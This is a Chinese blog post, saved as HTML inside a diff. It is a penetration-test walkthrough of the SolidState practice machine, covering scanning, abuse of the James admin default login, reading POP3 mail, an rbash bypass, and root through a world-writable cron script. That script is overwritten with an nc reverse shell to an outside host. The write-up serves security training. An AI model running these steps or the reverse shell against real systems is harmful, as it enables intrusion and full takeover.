@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://cos.kevinc.ltd/file/download?fileId=1419">
+    <script>
+        if(localStorage.getItem("meek_theme")==null){}
+        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
+        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    </script>
+    
+<title>靶机练习4: SolidState</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<span class="postTitle">靶机练习4: SolidState</span>
+<div class="title-right">
+
+    <a href="/"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+        </svg>
+    </button></a>
+
+    <a href="https://github.com/cha0s32/cha0s32.github.io/issues/7" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+    </button></a>
+
+    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </button>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody">
+<h2>信息收集阶段</h2>
+<p>全端口扫描，查询目标靶机开放端口和服务</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo nmap -p- -n -v -sS --max-retries=0 172.16.33.35</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6f41f2a2cf1dc1676c5330ca3ccac6b554fe3c0a4f734dea94d4ee882eca5726/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373935"><img src="https://camo.githubusercontent.com/6f41f2a2cf1dc1676c5330ca3ccac6b554fe3c0a4f734dea94d4ee882eca5726/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373935" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=795" style="max-width: 100%;"></a></p>
+<p>进行服务版本扫描</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -p22,25,80,110,119,4555 -sV -A 172.16.33.35</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d0698b264294f709533526b33bc03b17ab815ae55d232af84244b677eaf254fc/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373936"><img src="https://camo.githubusercontent.com/d0698b264294f709533526b33bc03b17ab815ae55d232af84244b677eaf254fc/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373936" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=796" style="max-width: 100%;"></a></p>
+<p>发现有陌生服务<code class="notranslate">james-admin</code>,尝试用<code class="notranslate">searchsploit</code>看看是否有利用脚本</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d1badf3ab3c6373f552188fcdf1b3e38931101d2184b7489931750ceffabda4e/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373937"><img src="https://camo.githubusercontent.com/d1badf3ab3c6373f552188fcdf1b3e38931101d2184b7489931750ceffabda4e/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373937" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=797" style="max-width: 100%;"></a></p>
+<p>有几个版本符合的脚本，尝试利用，但都不成功</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f6e09067c473e02ac522fdae2225cd93dba372ad0e087341917a71e2aebc0545/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373938"><img src="https://camo.githubusercontent.com/f6e09067c473e02ac522fdae2225cd93dba372ad0e087341917a71e2aebc0545/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373938" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=798" style="max-width: 100%;"></a></p>
+<p>查看脚本具体内容，发现<code class="notranslate">james-admin</code>默认账号密码都为<code class="notranslate">root</code>, 尝试登录</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/26c4618bd0e20df5dc5e8ca6baf97b1c99379666928de639ee09862ef27576df/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373939"><img src="https://camo.githubusercontent.com/26c4618bd0e20df5dc5e8ca6baf97b1c99379666928de639ee09862ef27576df/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d373939" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=799" style="max-width: 100%;"></a></p>
+<p>使用<code class="notranslate">help</code>查看可用命令，注意到有枚举用户的命令<code class="notranslate">listusers</code> 和修改密码的命令<code class="notranslate">setpassword</code>，修改各用户密码，然后登录<code class="notranslate">POP3</code> 邮箱服务，看各用户的邮件，命令如下：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -C 172.16.33.35 110
+
+USER mindy
+PASS 123
+
+LIST  <span class="pl-c"><span class="pl-c">#</span> 列出所有邮件</span>
+RETR 1 <span class="pl-c"><span class="pl-c">#</span> 查看对应邮件</span></pre></div>
+<h2>利用漏洞拿shell</h2>
+<p>发现<code class="notranslate">mindy</code>的邮件中有账号密码的泄漏，尝试拿这个账号密码去登录远程服务器</p>
+<p>登录成功！尝试修改密码，发现<code class="notranslate">Shell</code>被限制，为<code class="notranslate">rbash</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0c7b09721f6afa384591d2df1ec35f06be6624f0db9e0bf7d949ad6a1c01d4a2/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383031"><img src="https://camo.githubusercontent.com/0c7b09721f6afa384591d2df1ec35f06be6624f0db9e0bf7d949ad6a1c01d4a2/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383031" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=801" style="max-width: 100%;"></a></p>
+<p>尝试绕过<code class="notranslate">rbash</code>, 这里使用的方法是登录时加入 <code class="notranslate">-t "bash --noprofile"</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ssh mindy@172.16.33.35 -t <span class="pl-s"><span class="pl-pds">"</span>bash --noprofile<span class="pl-pds">"</span></span></pre></div>
+<p>登录成功后发现已成功绕过。</p>
+<p>跑一下<code class="notranslate">./linpeas.sh</code>提权脚本，发现没什么发现</p>
+<h2>提权</h2>
+<p>可以查看一下系统各个用户的进程，特别关注一下<code class="notranslate">james</code>的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ps aux <span class="pl-k">|</span> grep james</pre></div>
+<p>发现有一个<code class="notranslate">run.sh</code>在<code class="notranslate">opt</code>目录下，查看<code class="notranslate">opt</code>目录时发现有一个<code class="notranslate">tmp.py</code>文件,该文件的权限是所有用户可读可写可执行</p>
+<p>也可以这样查询</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">find / -user root -perm -o=w -type f <span class="pl-k">2&gt;</span>/dev/null <span class="pl-k">|</span> grep -v <span class="pl-s"><span class="pl-pds">'</span>proc\|sys<span class="pl-pds">'</span></span></pre></div>
+<p>通过查看该文件内容，判断该文件应该是一个定时删除<code class="notranslate">tmp</code>目录内文件的脚本，可尝试写入自己的反弹shell</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>import os;os.system("/bin/nc 10.8.0.17 777 -e /bin/bash")<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> tmp.py</pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1bf59ca58489c6e731ab3e67657420b3dd63e227e6e9782ead5d421e6c48d4d9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383032"><img src="https://camo.githubusercontent.com/1bf59ca58489c6e731ab3e67657420b3dd63e227e6e9782ead5d421e6c48d4d9/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383032" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=802" style="max-width: 100%;"></a></p>
+<p>等几分钟后获得shell，获得root权限</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e09a7144ebaf0c59ad0adae81241d1417ec930c7a728cd1e9d4766cd015a4e84/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383033"><img src="https://camo.githubusercontent.com/e09a7144ebaf0c59ad0adae81241d1417ec930c7a728cd1e9d4766cd015a4e84/68747470733a2f2f636f732e6b6576696e632e6c74642f66696c652f646f776e6c6f61643f66696c6549643d383033" data-canonical-src="https://cos.kevinc.ltd/file/download?fileId=803" style="max-width: 100%;"></a></p>
+</div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https:/cha0s32.github.io"> 呆毛的博客 </a>
+<p>
+<span id="runday"></span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if(""!=""){
+    var now=new Date();
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'post': 'M0 3.75C0 2.784.784 2 1.75 2h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 14H1.75A1.75 1.75 0 0 1 0 12.25Zm1.75-.25a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25ZM3.5 6.25a.75.75 0 0 1 .75-.75h7a.75.75 0 0 1 0 1.5h-7a.75.75 0 0 1-.75-.75Zm.75 2.25h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1 0-1.5Z', 'link': 'm7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z', 'about': 'M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z', 'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'rss': 'M2.002 2.725a.75.75 0 0 1 .797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 0 1-1.497.098 10.502 10.502 0 0 0-9.776-9.776.747.747 0 0 1-.7-.798ZM2.84 7.05h-.002a7.002 7.002 0 0 1 6.113 6.111.75.75 0 0 1-1.49.178 5.503 5.503 0 0 0-4.8-4.8.75.75 0 0 1 .179-1.489ZM2 13a1 1 0 1 1 2 0 1 1 0 0 1-2 0Z', 'upload': 'M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z M11.78 4.72a.749.749 0 1 1-1.06 1.06L8.75 3.811V9.5a.75.75 0 0 1-1.5 0V3.811L5.28 5.78a.749.749 0 1 1-1.06-1.06l3.25-3.25a.749.749 0 0 1 1.06 0l3.25 3.25Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z'};
+var utterancesLoad=0;
+if(localStorage.getItem("meek_theme")==null){localStorage.setItem("meek_theme","light");changeLight();}
+else if(localStorage.getItem("meek_theme")=="dark"){changeDark();}
+else if(localStorage.getItem("meek_theme")=="light"){changeLight();}
+
+function changeDark(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["moon"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#00f0ff";
+    if(utterancesLoad==1){utterancesTheme("dark-blue");}
+}
+function changeLight(){
+    document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList["sun"]);
+    document.getElementById("themeSwitch").parentNode.style.color="#ff5000";
+    if(utterancesLoad==1){utterancesTheme("github-light");}
+}
+function modeSwitch(){
+    if(document.getElementsByTagName("html")[0].attributes[0].value=="light"){changeDark();localStorage.setItem("meek_theme","dark");}
+    else{changeLight();localStorage.setItem("meek_theme","light");}
+}
+function utterancesTheme(theme){
+    const message = {type: 'set-theme',theme: theme};
+    const iframe = document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
+}
+
+console.log("\n %c Gmeek last %c https://github.com/Meekdai/Gmeek \n\n", "color: #fff; background-image: linear-gradient(90deg, rgb(47, 172, 178) 0%, rgb(45, 190, 96) 100%); padding:5px 1px;", "background-image: linear-gradient(90deg, rgb(45, 190, 96) 0%, rgb(255, 255, 255) 100%); padding:5px 0;");
+</script>
+
+<script>
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","cha0s32/cha0s32.github.io");
+    script.setAttribute("issue-term","title");
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else{script.setAttribute("theme","github-light");}
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+</script>
+
+
+
+
+</html>
